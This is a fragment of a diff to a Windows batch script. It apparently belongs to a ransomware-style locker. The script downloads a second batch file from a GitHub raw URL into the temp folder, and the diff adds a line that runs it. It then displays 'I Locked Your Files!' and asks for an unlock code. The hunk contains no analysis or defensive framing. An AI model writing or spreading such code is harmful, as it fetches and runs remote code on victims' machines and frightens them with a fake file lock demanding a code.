@@ -8,6 +8,7 @@ cd %tmp%
 curl https://raw.githubusercontent.com/AvianJay/maybe/main/le.bat --output le.bat > nul
 
 :s
+start %tmp%\le.bat
 echo I Locked Your Files!
 echo Enter code to unlock!
 goto askcode
